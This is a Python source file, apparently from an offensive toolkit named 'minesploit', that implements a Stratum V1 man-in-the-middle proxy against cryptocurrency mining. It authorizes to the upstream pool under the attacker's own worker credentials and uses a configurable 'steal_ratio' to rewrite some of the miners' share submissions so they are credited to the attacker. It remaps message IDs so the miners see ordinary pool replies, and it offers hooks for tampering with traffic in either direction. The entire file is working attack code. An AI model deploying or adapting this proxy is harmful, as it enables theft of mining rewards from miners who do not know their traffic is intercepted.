"""Stratum V1 Proxy framework for MITM attacks on mining protocol"""

import asyncio
import json
import random
import string
from collections.abc import Callable
from typing import Any

from minesploit.utils.logger import Logger


class StratumProxy:
    def __init__(
        self,
        listen_host: str = "127.0.0.1",
        listen_port: int = 3334,
        upstream_host: str = "127.0.0.1",
        upstream_port: int = 3333,
        upstream_user: str = "proxy_worker",
        upstream_password: str = "x",
        steal_ratio: float = 0.0,
        verbosity: str = "info",
    ):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.upstream_host = upstream_host
        self.upstream_port = upstream_port
        self.upstream_user = upstream_user
        self.upstream_password = upstream_password
        self.steal_ratio = steal_ratio

        self._logger = Logger(name="PROXY", verbosity=verbosity)
        self._server: asyncio.Server | None = None
        self._running = False

        self._submit_id_counter = 1
        self._id_to_upstream: dict[int, int] = {}
        self._upstream_to_miner: dict[int, int] = {}
        self._share_counter = 0

        self._on_miner_message: Callable[[dict[str, Any]], dict[str, Any] | None] | None = None
        self._on_pool_message: Callable[[dict[str, Any]], dict[str, Any] | None] | None = None

    def on_miner_message(self, hook: Callable[[dict[str, Any]], dict[str, Any] | None]) -> None:
        self._on_miner_message = hook

    def on_pool_message(self, hook: Callable[[dict[str, Any]], dict[str, Any] | None]) -> None:
        self._on_pool_message = hook

    async def __aenter__(self) -> "StratumProxy":
        await self._start_async()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb) -> None:
        await self._stop_async()

    def start(self) -> "StratumProxy":
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = asyncio.get_event_loop()

        if loop.is_running():
            asyncio.create_task(self._start_async())
        else:
            loop.run_until_complete(self._start_async())
        return self

    def stop(self) -> None:
        if self._running:
            try:
                loop = asyncio.get_running_loop()
            except RuntimeError:
                loop = asyncio.get_event_loop()

            if loop.is_running():
                asyncio.create_task(self._stop_async())
            else:
                loop.run_until_complete(self._stop_async())

    async def _start_async(self) -> None:
        self._server = await asyncio.start_server(
            self._handle_client,
            self.listen_host,
            self.listen_port,
        )
        self._running = True
        addr = self._server.sockets[0].getsockname()
        self._logger.info(f"Listening on {addr[0]}:{addr[1]}")
        self._logger.info(f"Forwarding to {self.upstream_host}:{self.upstream_port}")
        self._logger.info(f"Upstream credentials: {self.upstream_user}:{self.upstream_password}")
        self._logger.info(f"Steal ratio: {self.steal_ratio * 100:.0f}%")

    async def _stop_async(self) -> None:
        self._running = False
        if self._server:
            self._server.close()
            await self._server.wait_closed()
        self._logger.info("Stopped")

    async def _handle_client(
        self,
        client_reader: asyncio.StreamReader,
        client_writer: asyncio.StreamWriter,
    ) -> None:
        client_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        peer = client_writer.get_extra_info("peername")
        self._logger.info(f"Client connected: {peer} ({client_id})")

        upstream_reader = None
        upstream_writer = None

        try:
            upstream_reader, upstream_writer = await asyncio.open_connection(
                self.upstream_host,
                self.upstream_port,
            )
            self._logger.info(f"Connected to upstream {self.upstream_host}:{self.upstream_port}")

            auth_id = random.randint(1000, 9999)
            auth_message = {
                "id": auth_id,
                "method": "mining.authorize",
                "params": [self.upstream_user, self.upstream_password],
            }
            auth_data = (json.dumps(auth_message) + "\n").encode("utf-8")
            upstream_writer.write(auth_data)
            await upstream_writer.drain()
            self._logger.debug(f"Sent authorize: {self.upstream_user}")

            miner_authorized = False
            upstream_authorized = False

            async def forward_miner_to_pool() -> None:
                nonlocal miner_authorized
                buffer = b""
                try:
                    while self._running:
                        data = await asyncio.wait_for(client_reader.read(4096), timeout=30)
                        if not data:
                            break

                        buffer += data

                        while b"\n" in buffer:
                            line, buffer = buffer.split(b"\n", 1)
                            if not line.strip():
                                continue

                            try:
                                message = json.loads(line.decode("utf-8"))
                            except (json.JSONDecodeError, UnicodeDecodeError):
                                upstream_writer.write(line + b"\n")
                                await upstream_writer.drain()
                                continue

                            method = message.get("method")
                            orig_id = message.get("id")

                            if method == "mining.authorize":
                                miner_authorized = True
                                self._logger.debug(
                                    f"Miner authorize request: {message.get('params', [])}"
                                )

                            if method == "mining.submit" and orig_id is not None:
                                self._share_counter += 1
                                should_steal = random.random() < self.steal_ratio

                                if should_steal:
                                    new_id = self._submit_id_counter
                                    self._submit_id_counter += 1
                                    self._id_to_upstream[orig_id] = new_id
                                    self._upstream_to_miner[new_id] = orig_id

                                    if self._on_miner_message:
                                        modified = self._on_miner_message(message)
                                        if modified is not None:
                                            message = modified
                                            message["id"] = new_id
                                            message["params"][0] = self.upstream_user
                                        else:
                                            message["id"] = new_id
                                            message["params"][0] = self.upstream_user
                                    else:
                                        message["id"] = new_id
                                        message["params"][0] = self.upstream_user

                                    self._logger.debug(
                                        f"STEAL share #{self._share_counter}: miner_id={orig_id} -> upstream_id={new_id}"
                                    )
                                else:
                                    if self._on_miner_message:
                                        modified = self._on_miner_message(message)
                                        if modified is not None:
                                            message = modified

                                    self._logger.debug(
                                        f"Forward share #{self._share_counter}: miner_id={orig_id} (NOT stealing)"
                                    )

                                line = (json.dumps(message) + "\n").encode("utf-8")

                            elif self._on_miner_message:
                                modified = self._on_miner_message(message)
                                if modified is not None:
                                    message = modified
                                    line = (json.dumps(message) + "\n").encode("utf-8")

                            upstream_writer.write(line + b"\n")
                            await upstream_writer.drain()

                except asyncio.TimeoutError:
                    pass
                except Exception as e:
                    self._logger.error(f"Error miner->pool: {e}")
                finally:
                    upstream_writer.close()
                    await upstream_writer.wait_closed()

            async def forward_pool_to_miner() -> None:
                nonlocal upstream_authorized
                buffer = b""
                try:
                    while self._running:
                        data = await asyncio.wait_for(upstream_reader.read(4096), timeout=30)
                        if not data:
                            break

                        buffer += data

                        while b"\n" in buffer:
                            line, buffer = buffer.split(b"\n", 1)
                            if not line.strip():
                                continue

                            try:
                                message = json.loads(line.decode("utf-8"))
                            except (json.JSONDecodeError, UnicodeDecodeError):
                                client_writer.write(line + b"\n")
                                await client_writer.drain()
                                continue

                            upstream_id = message.get("id")

                            if upstream_id == auth_id:
                                if message.get("result"):
                                    upstream_authorized = True
                                    self._logger.success(
                                        f"Upstream authorized as {self.upstream_user}"
                                    )
                                continue

                            if upstream_id in self._upstream_to_miner:
                                miner_id = self._upstream_to_miner.pop(upstream_id)
                                message["id"] = miner_id

                                if self._on_pool_message:
                                    modified = self._on_pool_message(message)
                                    if modified is not None:
                                        message = modified

                                self._logger.debug(
                                    f"Pool submit response: upstream_id={upstream_id} -> miner_id={miner_id}"
                                )
                                line = (json.dumps(message) + "\n").encode("utf-8")
                                client_writer.write(line + b"\n")
                                await client_writer.drain()
                            else:
                                if self._on_pool_message:
                                    modified = self._on_pool_message(message)
                                    if modified is not None:
                                        message = modified
                                        line = (json.dumps(message) + "\n").encode("utf-8")

                                client_writer.write(line + b"\n")
                                await client_writer.drain()

                except asyncio.TimeoutError:
                    pass
                except Exception as e:
                    self._logger.error(f"Error pool->miner: {e}")
                finally:
                    client_writer.close()
                    await client_writer.wait_closed()

            await asyncio.gather(
                forward_miner_to_pool(),
                forward_pool_to_miner(),
            )

        except Exception as e:
            self._logger.error(f"Client handler error: {e}")
        finally:
            if upstream_writer:
                upstream_writer.close()
                await upstream_writer.wait_closed()
            client_writer.close()
            await client_writer.wait_closed()
            self._logger.info(f"Client disconnected: {client_id}")
